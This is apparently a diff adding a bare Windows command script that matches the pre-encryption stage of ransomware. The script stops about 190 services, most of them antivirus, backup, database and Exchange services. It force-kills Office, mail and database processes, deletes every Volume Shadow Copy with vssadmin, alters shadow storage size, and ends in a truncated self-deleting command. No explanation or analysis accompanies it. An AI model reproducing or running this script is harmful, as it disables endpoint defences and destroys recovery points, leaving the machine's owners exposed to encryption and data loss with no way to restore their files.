@@ -1,0 +1,230 @@
+        powershell -Command "& { }"
+        net stop "Acronis VSS Provider" /y
+        net stop "Enterprise Client Service" /y
+        net stop "Sophos Agent" /y
+        net stop "Sophos AutoUpdate Service" /y
+        net stop "Sophos Clean Service" /y
+        net stop "Sophos Device Control Service" /y
+        net stop "Sophos File Scanner Service" /y
+        net stop "Sophos Health Service" /y
+        net stop "Sophos MCS Agent" /y
+        net stop "Sophos MCS Client" /y
+        net stop "Sophos Message Router" /y
+        net stop "Sophos Safestore Service" /y
+        net stop "Sophos System Protection Service" /y
+        net stop "Sophos Web Control Service" /y
+        net stop "SQLsafe Backup Service" /y
+        net stop "SQLsafe Filter Service" /y
+        net stop "Symantec System Recovery" /y
+        net stop "Veeam Backup Catalog Data Service" /y
+        net stop "AcronisAgent" /y
+        net stop "AcrSch2Svc" /y
+        net stop "Antivirus" /y
+        net stop "ARSM" /y
+        net stop "BackupExecAgentAccelerator" /y
+        net stop "BackupExecAgentBrowser" /y
+        net stop "BackupExecDeviceMediaService" /y
+        net stop "BackupExecJobEngine" /y
+        net stop "BackupExecManagementService" /y
+        net stop "BackupExecRPCService" /y
+        net stop "BackupExecVSSProvider" /y
+        net stop "bedbg" /y
+        net stop "DCAgent" /y
+        net stop "EPSecurityService" /y
+        net stop "EPUpdateService" /y
+        net stop "EraserSvc11710" /y
+        net stop "EsgShKernel" /y
+        net stop "FA_Scheduler" /y
+        net stop "IISAdmin" /y
+        net stop "IMAP4Svc" /y
+        net stop "macmnsvc" /y
+        net stop "masvc" /y
+        net stop "MBAMService" /y
+        net stop "MBEndpointAgent" /y
+        net stop "McAfeeEngineService" /y
+        net stop "McAfeeFramework" /y
+        net stop "McAfeeFrameworkMcAfeeFramework" /y
+        net stop "McShield" /y
+        net stop "McTaskManager" /y
+        net stop "mfemms" /y
+        net stop "mfevtp" /y
+        net stop "MMS" /y
+        net stop "mozyprobackup" /y
+        net stop "MsDtsServer" /y
+        net stop "MsDtsServer100" /y
+        net stop "MsDtsServer110" /y
+        net stop "MSExchangeES" /y
+        net stop "MSExchangeIS" /y
+        net stop "MSExchangeMGMT" /y
+        net stop "MSExchangeMTA" /y
+        net stop "MSExchangeSA" /y
+        net stop "MSExchangeSRS" /y
+        net stop "MSOLAP$SQL_2008" /y
+        net stop "MSOLAP$SYSTEM_BGC" /y
+        net stop "MSOLAP$TPS" /y
+        net stop "MSOLAP$TPSAMA" /y
+        net stop "MSSQL$BKUPEXEC" /y
+        net stop "MSSQL$ECWDB2" /y
+        net stop "MSSQL$PRACTICEMGT" /y
+        net stop "MSSQL$PRACTTICEBGC" /y
+        net stop "MSSQL$PROFXENGAGEMENT" /y
+        net stop "MSSQL$SBSMONITORING" /y
+        net stop "MSSQL$SHAREPOINT" /y
+        net stop "MSSQL$SQL_2008" /y
+        net stop "MSSQL$SYSTEM_BGC" /y
+        net stop "MSSQL$TPS" /y
+        net stop "MSSQL$TPSAMA" /y
+        net stop "MSSQL$VEEAMSQL2008R2" /y
+        net stop "MSSQL$VEEAMSQL2012" /y
+        net stop "MSSQLFDLauncher" /y
+        net stop "MSSQLFDLauncher$PROFXENGAGEMENT" /y
+        net stop "MSSQLFDLauncher$SBSMONITORING" /y
+        net stop "MSSQLFDLauncher$SHAREPOINT" /y
+        net stop "MSSQLFDLauncher$SQL_2008" /y
+        net stop "MSSQLFDLauncher$SYSTEM_BGC" /y
+        net stop "MSSQLFDLauncher$TPS" /y
+        net stop "MSSQLFDLauncher$TPSAMA" /y
+        net stop "MSSQLSERVER" /y
+        net stop "MSSQLServerADHelper100" /y
+        net stop "MSSQLServerOLAPService" /y
+        net stop "MySQL80" /y
+        net stop "MySQL57" /y
+        net stop "ntrtscan" /y
+        net stop "OracleClientCache80" /y
+        net stop "PDVFSService" /y
+        net stop "POP3Svc" /y
+        net stop "ReportServer" /y
+        net stop "ReportServer$SQL_2008" /y
+        net stop "ReportServer$SYSTEM_BGC" /y
+        net stop "ReportServer$TPS" /y
+        net stop "ReportServer$TPSAMA" /y
+        net stop "RESvc" /y
+        net stop "sacsvr" /y
+        net stop "SamSs" /y
+        net stop "SAVAdminService" /y
+        net stop "SAVService" /y
+        net stop "SDRSVC" /y
+        net stop "SepMasterService" /y
+        net stop "ShMonitor" /y
+        net stop "Smcinst" /y
+        net stop "SmcService" /y
+        net stop "SMTPSvc" /y
+        net stop "SNAC" /y
+        net stop "SntpService" /y
+        net stop "sophossps" /y
+        net stop "SQLAgent$BKUPEXEC" /y
+        net stop "SQLAgent$ECWDB2" /y
+        net stop "SQLAgent$PRACTTICEBGC" /y
+        net stop "SQLAgent$PRACTTICEMGT" /y
+        net stop "SQLAgent$PROFXENGAGEMENT" /y
+        net stop "SQLAgent$SBSMONITORING" /y
+        net stop "SQLAgent$SHAREPOINT" /y
+        net stop "SQLAgent$SQL_2008" /y
+        net stop "SQLAgent$SYSTEM_BGC" /y
+        net stop "SQLAgent$TPS" /y
+        net stop "SQLAgent$TPSAMA" /y
+        net stop "SQLAgent$VEEAMSQL2008R2" /y
+        net stop "SQLAgent$VEEAMSQL2012" /y
+        net stop "SQLBrowser" /y
+        net stop "SQLSafeOLRService" /y
+        net stop "SQLSERVERAGENT" /y
+        net stop "SQLTELEMETRY" /y
+        net stop "SQLTELEMETRY$ECWDB2" /y
+        net stop "SQLWriter" /y
+        net stop "SstpSvc" /y
+        net stop "svcGenericHost" /y
+        net stop "swi_filter" /y
+        net stop "swi_service" /y
+        net stop "swi_update_64" /y
+        net stop "TmCCSF" /y
+        net stop "tmlisten" /y
+        net stop "TrueKey" /y
+        net stop "TrueKeyScheduler" /y
+        net stop "TrueKeyServiceHelper" /y
+        net stop "UI0Detect" /y
+        net stop "VeeamBackupSvc" /y
+        net stop "VeeamBrokerSvc" /y
+        net stop "VeeamCatalogSvc" /y
+        net stop "VeeamCloudSvc" /y
+        net stop "VeeamDeploymentService" /y
+        net stop "VeeamDeploySvc" /y
+        net stop "VeeamEnterpriseManagerSvc" /y
+        net stop "VeeamMountSvc" /y
+        net stop "VeeamNFSSvc" /y
+        net stop "VeeamRESTSvc" /y
+        net stop "VeeamTransportSvc" /y
+        net stop "W3Svc" /y
+        net stop "wbengine" /y
+        net stop "WRSVC" /y
+        net stop "VeeamHvIntegrationSvc" /y
+        net stop "swi_update" /y
+        net stop "SQLAgent$CXDB" /y
+        net stop "SQLAgent$CITRIX_METAFRAME" /y
+        net stop "SQL Backups" /y
+        net stop "MSSQL$PROD" /y
+        net stop "Zoolz 2 Service" /y
+        net stop "MSSQLServerADHelper" /y
+        net stop "SQLAgent$PROD" /y
+        net stop "msftesql$PROD" /y
+        net stop "NetMsmqActivator" /y
+        net stop "EhttpSrv" /y
+        net stop "ekrn" /y
+        net stop "ESHASRV" /y
+        net stop "MSSQL$SOPHOS" /y
+        net stop "SQLAgent$SOPHOS" /y
+        net stop "AVP" /y
+        net stop "klnagent" /y
+        net stop "MSSQL$SQLEXPRESS" /y
+        net stop "SQLAgent$SQLEXPRESS" /y
+        net stop "kavfsslp" /y
+        net stop "KAVFSGT" /y
+        net stop "KAVFS" /y
+        net stop "mfefire" /y
+        taskkill /F /IM zoolz.exe /T
+        taskkill /F /IM agntsvc.exe /T
+        taskkill /F /IM dbeng50.exe /T
+        taskkill /F /IM dbsnmp.exe /T
+        taskkill /F /IM encsvc.exe /T
+        taskkill /F /IM excel.exe /T
+        taskkill /F /IM firefoxconfig.exe /T
+        taskkill /F /IM infopath.exe /T
+        taskkill /F /IM isqlplussvc.exe /T
+        taskkill /F /IM msaccess.exe /T
+        taskkill /F /IM msftesql.exe /T
+        taskkill /F /IM mspub.exe /T
+        taskkill /F /IM mydesktopqos.exe /T
+        taskkill /F /IM mydesktopservice.exe /T
+        taskkill /F /IM mysqld.exe /T
+        taskkill /F /IM mysqld-nt.exe /T
+        taskkill /F /IM mysqld-opt.exe /T
+        taskkill /F /IM ocautoupds.exe /T
+        taskkill /F /IM ocomm.exe /T
+        taskkill /F /IM ocssd.exe /T
+        taskkill /F /IM onenote.exe /T
+        taskkill /F /IM oracle.exe /T
+        taskkill /F /IM outlook.exe /T
+        taskkill /F /IM powerpnt.exe /T
+        taskkill /F /IM sqbcoreservice.exe /T
+        taskkill /F /IM sqlagent.exe /T
+        taskkill /F /IM sqlbrowser.exe /T
+        taskkill /F /IM sqlservr.exe /T
+        taskkill /F /IM sqlwriter.exe /T
+        taskkill /F /IM steam.exe /T
+        taskkill /F /IM synctime.exe /T
+        taskkill /F /IM tbirdconfig.exe /T
+        taskkill /F /IM thebat.exe /T
+        taskkill /F /IM thebat64.exe /T
+        taskkill /F /IM thunderbird.exe /T
+        taskkill /F /IM visio.exe /T
+        taskkill /F /IM winword.exe /T
+        taskkill /F /IM wordpad.exe /T
+        taskkill /F /IM xfssvccon.exe /T
+        taskkill /F /IM tmlisten.exe /T
+        taskkill /F /IM PccNTMon.exe /T
+        taskkill /F /IM CNTAoSMgr.exe /T
+        taskkill /F /IM Ntrtscan.exe /T
+        taskkill /F /IM mbamtray.exe /T
+        vssadmin Delete Shadows /all /quiet
+        vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB
+        vssadmin resize shadowstorage /for=C: /on=C: /maxsize=unbounded
+        cmd /c ping localhost -n 3 > nul & del 
